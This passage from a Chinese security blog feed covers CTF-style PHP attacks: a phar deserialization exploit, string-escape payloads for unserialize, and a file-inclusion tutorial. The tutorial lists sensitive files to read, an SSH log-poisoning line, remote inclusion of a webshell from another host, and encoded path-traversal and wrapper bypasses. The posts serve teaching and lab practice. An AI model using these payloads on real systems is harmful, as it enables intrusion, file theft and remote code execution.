operator">&gt;</span><span class="token property">params</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'source'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"/var/www/html/f1ag.php"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">str</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'str'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$c</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"exp.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//生成phar文件</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'&lt;?php __HALT_COMPILER(); ? &gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//触发头是C1e4r类</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"exp.txt"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//生成签名</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改生成得phar文件后缀</p><p>上传成功后回到文件读取点来读phar文件</p><p>拿到base64加密得flag</p><p><img src="https://i.loli.net/2021/08/24/Whwx98G4yaKbvEL.png"></p><h1 id="反序列化字符逃逸"><a href="#反序列化字符逃逸" class="headerlink" title="反序列化字符逃逸"></a>反序列化字符逃逸</h1><h2 id="一、概念"><a href="#一、概念" class="headerlink" title="一、概念"></a>一、概念</h2><p>在反序列化前，对序列化后的字符串进行替换或者修改，使得字符串的长度发生了变化，通过构造特定的字符串，导致对象注入等恶意操作。</p><h2 id="二、字符变多"><a href="#二、字符变多" class="headerlink" title="二、字符变多"></a>二、字符变多</h2><p>例子：</p><p>该题源码如下</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token single-quoted-string string">'flag.php'</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'x'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'yy'</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token double-quoted-string string">"aaa"</span><span class="token punctuation">;</span><span class="token variable">$user</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$s</span><span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$r</span><span class="token operator">=</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span>  <span class="token variable">$r</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>文件包含了<code>flag</code></p><p>然后<code>filter()</code>方法，会将序列化字符串中的x替换为yy，可能会导致字符串长度</p><p>我们试着传入<code>u=admin</code></p><p>序列化为：</p><pre class="line-numbers language-none"><code class="language-none">a:2:{i:0;s:5:\"admin\";i:1;s:3:\"aaa\";}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>反序列化后</p><p><img src="https://i.loli.net/2021/08/25/Gd4msifBVrgOcJQ.png"></p><p>a[1]不等于”admin” 没有满足条件</p><p>我们构造一下数组</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">a:2:{i:0;s:1:"a";i:1;s:5:"admin";}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是我们只有一个参数<code>username</code>可控</p><p>可以利用字符串逃逸</p><p>复制自己想要构造的字符串</p><pre class="line-numbers language-none"><code class="language-none">";i:1;s:5:"admin";}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>按照长度添加字符串，已知长度为19</p><p>则在前方填充19个x</p><pre class="line-numbers language-none"><code class="language-none">'xxxxxxxxxxxxxxxxxxx";i:1;s:5:"admin";}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>测试一下</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'xxxxxxxxxxxxxxxxxxx";i:1;s:5:"admin";}'</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$s</span><span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$v</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'x'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'yy'</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$v</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果</p><pre class="line-numbers language-none"><code class="language-none">a:2:{i:0;s:38:"yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy";i:1;s:5:"admin";}";i:1;s:1:"a";}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到已经逃逸出来了</p><p>这里利用了序列化的特性</p><p>反序列化看一下</p><pre class="line-numbers language-成功逃逸" data-language="成功逃逸"><code class="language-成功逃逸">array(2) {  [0] =&gt;  string(38) "yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy"  [1] =&gt;  string(5) "admin"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以观察整个数据的变化</p><p><img src="https://i.loli.net/2021/08/25/1QgPb694Oia2cTU.png"></p><p>成功逃逸。获得flag</p><h2 id="三、字符变少"><a href="#三、字符变少" class="headerlink" title="三、字符变少"></a>三、字符变少</h2><p>也是拿一道题做例子</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token single-quoted-string string">'flag.php'</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'sec'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">''</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'p'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$auth</span><span class="token operator">=</span><span class="token double-quoted-string string">"guest"</span><span class="token punctuation">;</span><span class="token variable">$user</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$s</span><span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$r</span><span class="token operator">=</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> flag<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>跟上一道题差不多</p><p>先随意构造一下争取的payload：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"u"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"p"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$s</span><span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span>  <span class="token variable">$s</span><span class="token punctuation">;</span><span class="token variable">$v</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'sec'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">''</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行后拿到所需部分</p><pre class="line-numbers language-none"><code class="language-none">";i:2;s:5:"admin";}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>需要我们传入的payload</p><pre class="line-numbers language-none"><code class="language-none">u=xxx&amp;p=xxxx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>已知两个可控值中间的部分不变（可能会多一位）</p><pre class="line-numbers language-none"><code class="language-none">";i:1;s:1:"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里可以利用替换方法换成空值从而完成逃逸</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"secsecsecsec"</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'";i:1;s:1:"p";i:2;s:5:"admin";}'</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$s</span><span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span>  <span class="token variable">$s</span><span class="token punctuation">;</span><span class="token variable">$v</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'sec'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">''</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行结果</p><pre class="line-numbers language-none"><code class="language-none">a:3:{i:0;s:12:"secsecsecsec";i:1;s:31:"";i:1;s:1:"p";i:2;s:5:"admin";}";i:2;s:5:"admin";}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到已经完成了逃逸</p><p>反序列化一下看看</p><pre class="line-numbers language-none"><code class="language-none">array(3) {  [0] =&gt;  string(12) "";i:1;s:31:""  [1] =&gt;  string(1) "p"  [2] =&gt;  string(5) "admin"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2021/08/25/lw4D1a3xpSjbrX7.png"></p><p>a[2]=admin 拿到flag</p><p><img src="https://i.loli.net/2021/08/25/aUcp47NDeqkvo93.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="网络安全" scheme="https://h3h3qaq.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>PHP文件包含漏洞基础</title>
    <link href="https://h3h3qaq.github.io/posts/f4224d8e.html"/>
    <id>https://h3h3qaq.github.io/posts/f4224d8e.html</id>
    <published>2021-11-10T13:35:22.000Z</published>
    <updated>2021-11-11T02:31:30.277Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、文件包含漏洞"><a href="#一、文件包含漏洞" class="headerlink" title="一、文件包含漏洞"></a>一、文件包含漏洞</h1><p>文件包含主要是为了更好地使用代码的重用性，引入了文件包含函数，通过文件包含函数将文件包含进来，直接使用包含文件的代码，简单点来说就是一个文件里面包含另外一个或多个文件。</p><h1 id="二、漏洞产生原因"><a href="#二、漏洞产生原因" class="headerlink" title="二、漏洞产生原因"></a>二、漏洞产生原因</h1><p>服务器在执行PHP文件的时候，用户可控文件的参数，并且没有严格的检验和过滤，或者被Bypass，操作一些敏感文件来导致文件泄露和恶意代码注入等危害</p><p>举一个简单的例子</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这里的<code>filename</code>参数没有经过过滤，直接赋值给<code>include()</code>函数，我们就可以修改<code>filenname</code>的值，执行其他操作</p><p>我们在同目录下创建一个<code>info.txt</code></p><p>内容如下</p><p><img src="https://i.loli.net/2021/09/29/KGvSAi4Ha9VIeR5.png"></p><p>这样我们只需要把<code>info.txt</code>包含进去即可解析</p><p><img src="https://i.loli.net/2021/09/29/f41k8sFO7qRdTGB.png"></p><h1 id="三、PHP常用的包含函数"><a href="#三、PHP常用的包含函数" class="headerlink" title="三、PHP常用的包含函数"></a>三、PHP常用的包含函数</h1><p>在php中，常用的为以下4个函数</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">require</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>其中<code>include</code>和<code>require</code>的区别主要是<code>include</code>在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而<code>require</code>函数出现错误的时候，会直接报错并退出程序的执行。</p><p><img src="https://i.loli.net/2021/09/29/OSYPlCQxfTcrn29.png"></p><p><code>include_once</code>，<code>require_once</code>这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</p><p><img src="https://i.loli.net/2021/09/29/8GWct7SjCYgzXx4.png"></p><h1 id="四、漏洞利用"><a href="#四、漏洞利用" class="headerlink" title="四、漏洞利用"></a>四、漏洞利用</h1><p>文件包含利用有两种</p><pre class="line-numbers language-none"><code class="language-none">1.包含本地服务器的文件2.包含其他服务器的文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>而且，包含的时候，不一定要包含php文件</p><p>只要文件中有一块完整的php代码即可</p><p>例如<code>a.txt</code></p><p>内容为</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php phpinfo(); ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也是可以的</p><h2 id="1-包含本地服务器的文件"><a href="#1-包含本地服务器的文件" class="headerlink" title="1.包含本地服务器的文件"></a>1.包含本地服务器的文件</h2><p>举一个例子，利用CTFSHOW的靶机</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里没有做任何限制，我们可以读取任意文件（罗列一些常用的，其他的师傅们可以自行收集）</p><pre class="line-numbers language-none"><code class="language-none">/etc/apache2/*#Apache配置文件，可以获知Web目录、服务端口等信息/etc/nginx/*#Nginx配置文件，可以获知Web目录、服务端口等信息/etc/crontab#定时任务文件/etc/environment#环境变量配置文件之一。环境变量可能存在大量目录信息的泄露，甚至可能出现secret key泄露的情况/etc/hostname#主机名/etc/hosts#主机名查询静态表，包含指定域名解析IP的成对信息。通过这个文件，可以探测网卡信息和内网IP/域名/etc/issue#系统版本信息/etc/mysql/*#MYSQL配置文件/etc/php/*#PHP配置文件/proc 目录#/proc目录通常存储着进程动态运行的各种信息，本质上是一种虚拟目录，如果查看非当前进程的信息，pid是可以进行暴力破解的，如果要查看当前进程，只需/proc/self代替/proc/[pid]即可/proc/[pid]/cmdline#cmdline可读出比较敏感的信息# ssh日志，攻击方法：ssh `&lt;?php phpinfo(); ?&gt;`@192.168.1.1/var/log/auth.log# apache日志/var/log/apache2/[access.log|error.log]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><a href="https://www.anquanke.com/post/id/231407">https://www.anquanke.com/post/id/231407</a></p></blockquote><p>这里可以读取任意文件，我们可以试着读<code>/etc/passwd</code></p><p><img src="https://i.loli.net/2021/09/29/BKbZx2hzpq18kvI.png"></p><h2 id="2-包含远程服务器的文件"><a href="#2-包含远程服务器的文件" class="headerlink" title="2.包含远程服务器的文件"></a>2.包含远程服务器的文件</h2><p>这里需要前提</p><pre class="line-numbers language-none"><code class="language-none">allow_url_fopen = On 是否允许打开远程文件allow_url_include = On 是否允许include/require远程文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这里可以本地测试一下，利用虚拟机做远程服务器</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">Include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里存在文件包含漏洞</p><p><img src="https://i.loli.net/2021/09/29/ipOaUYZBuwmlzdT.png"></p><p>“服务器”上存在webshell</p><p>传参：</p><pre class="line-numbers language-none"><code class="language-none">http://localhost/include.php?page=http://192.168.179.129/1.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2021/09/29/HZT1fJxPSLtVd6m.png"></p><p>可以看到成功包含到了webshell</p><h2 id="3-限制后缀名"><a href="#3-限制后缀名" class="headerlink" title="3.限制后缀名"></a>3.限制后缀名</h2><p>例子</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">.</span> <span class="token double-quoted-string string">".H3h3QAQ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到，在进行包含文件的时候文件名后缀进行了拼接，强制后缀为<code>H3h3QAQ</code></p><p>所以我们需要Bypass</p><h3 id="1-00截断"><a href="#1-00截断" class="headerlink" title="(1).%00截断"></a>(1).%00截断</h3><p>需要PHP&lt;5.3.4并且magic_quotes_gpc = Off</p><pre class="line-numbers language-none"><code class="language-none">/include.php?page=info.txt%00<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-长度截断"><a href="#2-长度截断" class="headerlink" title="(2).长度截断"></a>(2).长度截断</h3><p>PHP版本&lt;=5.2.?</p><blockquote><p>Windows下目录最大长度为256字节，超出的部分会被丢弃掉<br>Linux下目录最大长度为4096字节，超出的部分会被丢弃掉</p></blockquote><p>构造payload的时候超出限制即可</p><p>类似于</p><pre class="line-numbers language-none"><code class="language-none">/include.php?page=info.txt....................*n<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-伪协议"><a href="#3-伪协议" class="headerlink" title="(3).伪协议"></a>(3).伪协议</h3><pre class="line-numbers language-none"><code class="language-none">zip://文件路径/zip文件名称#压缩包内的文件名称 （使用时注意将#号进行URL编码）phar://文件路径/phar文件名称/phar内的文件名称phar://协议与zip://类似，同样可以访问zip格式压缩包内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>多配合在上传题使用</p><p>若发现只有jpg、png才可以上传文件</p><p>则可以利用phar伪协议</p><p>写一个shell 将后缀名改成.php 再将其压缩，再改成*.jpg、*.png 此时可以上传<br>提示成功后，利用菜刀添加/include.php?file=phar*://***/a.png/a即可</p><pre class="line-numbers language-none"><code class="language-none">?file=zip://D:\zip.jpg%23phpinfo?file=phar://zip.zip/phpinfo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="4-限制前缀"><a href="#4-限制前缀" class="headerlink" title="4.限制前缀"></a>4.限制前缀</h2><p>例如<code>../</code>被过滤</p><p>可以利用url编码</p><pre class="line-numbers language-none"><code class="language-none">../%2e%2e%2f..%2f%2e%2e/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>或者二次编码</p><pre class="line-numbers language-none"><code class="language-none">../%252e%252e%252f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="5-PHP伪协议"><a href="#5-PHP伪协议" class="headerlink" title="5.PHP伪协议"></a>5.PHP伪协议</h2><h3 id="1-file-协议"><a href="#1-file-协议" class="headerlink" title="(1).file:// 协议"></a>(1).file:// 协议</h3><p>用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受<code>allow_url_fopen</code>与<code>allow_url_include</code>的影响。<br><code>include()/require()/include_once()/require_once()</code>参数可控的情况下，如导入为非<code>.php</code>文件，则仍按照php语法进行解析，这是<code>include()</code>函数所决定的。</p><pre class="line-numbers language-none"><code class="language-none">POC/include.php?file=file://phpinfo.txt/include.php?file=http://127.0.0.1/phpinfo.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="2-php-协议"><a href="#2-php-协议" class="headerlink" title="(2).php://协议"></a>(2).php://协议</h3><p><code>allow_url_include</code> :仅<code>php://input php://stdin php://memory php://temp </code>需要on</p><pre class="line-numbers language-none"><code class="language-none">php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><table><thead><tr><th><strong>协议</strong></th><th>作用</th></tr></thead><tbody><tr><td>php://input</td><td>可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，在<code>enctype="multipart/form-data"</code> 的时候<code>php://input 